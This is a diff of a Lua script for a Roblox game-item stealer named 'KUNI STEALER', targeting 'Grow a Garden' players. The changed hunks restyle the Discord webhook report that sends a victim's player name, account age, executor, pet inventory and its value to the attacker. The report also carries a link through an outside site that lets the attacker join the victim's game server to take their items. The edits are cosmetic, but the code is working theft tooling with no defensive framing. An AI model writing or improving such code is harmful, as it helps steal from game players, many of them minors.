@@ -104,11 +104,11 @@ end
 -- Send Discord webhook embed
 local function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
-        title = "KUNI STEALER",
+        title = " ⚠️GROW A GARDEN HITS - KUNI STEALER⚠️",
         color = 65280,
         fields = {
             {
-                name = "ðŸ‘¤ **Player Information**",
+                name = "**Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     LocalPlayer.Name, 
                     table.concat(USERNAMES, " "), 
@@ -118,17 +118,17 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 inline = false
             },
             {
-                name = "ðŸ’° **Total Value**",
+                name = "🥀**Total Value**",
                 value = string.format("```%sÂ¢```", totalValue),
                 inline = false
             },
             {
-                name = "ðŸŒ´ **Backpack**",
+                name = "🎒**Backpack**",
                 value = string.format("```%s```", petList),
                 inline = false
             },
             {
-                name = "ðŸï¸ **Join with URL**",
+                name = "🥀**Join with URL**",
                 value = string.format(
                     "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                     game.JobId, 
